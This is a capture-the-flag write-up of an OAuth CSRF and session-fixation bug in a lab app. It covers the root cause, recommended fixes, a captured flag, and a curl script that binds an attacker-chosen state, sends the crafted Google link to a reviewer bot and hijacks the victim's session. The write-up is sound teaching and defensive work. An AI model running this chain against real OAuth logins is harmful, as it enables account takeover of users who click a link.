# Solo Leveling: State Gate — OAuth CSRF via crafted Google link

Date: 2026-07-11
Target: https://solo-leveling-2-ea081cffdc8f.pwnbox-lab.com/
Google IdP: https://google-ea081cffdc8f.pwnbox-lab.com/
Bug class: OAuth CSRF / session fixation (stateless `tk` binding)

## Observation

- `GET /` sets HttpOnly `tk` cookie (~64 hex).
- `GET /init` (with `tk`) mints server-side OAuth `state` (262 hex) and redirects to Google.
- Victim completing OAuth hits `/callback?code=...&state=...` — code is staged server-side for that `state`.
- Attacker with matching preshot `tk` can `GET /auth` **without possessing the authorization code** and receive the victim's session.
- `/logger` removed vs sl3; no exfil primitive required.

## Hypothesis

Author hint ($8k H1 OAuth link ATO): attacker crafts Google OAuth URL with attacker-bound `state`; victim click completes login into attacker's pending gate session.

## Evidence

1. Attacker preshot → report crafted OAuth URL via `POST /report`.
2. ~3s later attacker `GET /auth` → `/profile` shows **Statue of God**.
3. Flag: `pwnbox{277159c61b39f55d2b3aef4179e19af4}`

## Minimal reproduction

```bash
# 1. Attacker preshot (save cookies)
curl -sS -c /tmp/att.txt 'https://solo-leveling-2-ea081cffdc8f.pwnbox-lab.com/' -o /dev/null
STATE=$(curl -sS -b /tmp/att.txt 'https://solo-leveling-2-ea081cffdc8f.pwnbox-lab.com/init' -D - -o /dev/null | grep -i '^location:' | sed 's/.*state=//' | cut -d'&' -f1)

# 2. Craft OAuth link
OAUTH="https://google-ea081cffdc8f.pwnbox-lab.com/o/oauth2/v2/auth?client_id=solo-leveling-2-client&redirect_uri=https%3A%2F%2Fsolo-leveling-2-ea081cffdc8f.pwnbox-lab.com%2Fcallback&response_type=code&scope=openid%20email%20profile&prompt=none&state=${STATE}"

# 3. Send to reviewer bot
curl -sS -b /tmp/att.txt -X POST 'https://solo-leveling-2-ea081cffdc8f.pwnbox-lab.com/report' --data-urlencode "url=${OAUTH}"

# 4. Attacker completes binding
curl -sS -b /tmp/att.txt 'https://solo-leveling-2-ea081cffdc8f.pwnbox-lab.com/auth' -L
curl -sS -b /tmp/att.txt 'https://solo-leveling-2-ea081cffdc8f.pwnbox-lab.com/profile'
```

## Root cause

OAuth `state` is bound to attacker's `tk` at `/init`, but the authorization `code` from any victim completing that `state` is accepted server-side without verifying the callback came from the same browser/session that initiated the flow. Attacker completes `/auth` with pre-seeded `tk`.

## Why sl3-style exfil failed

We chased `/logger` / DOMPurify / hash exfil from the previous instance. The actual bug is simpler: **no code theft** — server stages the code when the victim hits `/callback`.

## Fix

- Bind `state` to client session immutably; reject code exchange unless callback request presents same session that created `state`.
- One-time use + PKCE for public clients.
- Do not allow attacker-initiated `state` to be completed by a different user's IdP login.

## Knowledge base (extracted)

- `notes/oauth-tk-state-csrf-staged-code-exchange.md` — reusable pattern
- `writeups/solo-leveling-state-gate-oauth-csrf.md` — clean writeup
- `payloads/oauth/crafted-oauth-link-csrf-review-bot.md` — report-bot payload
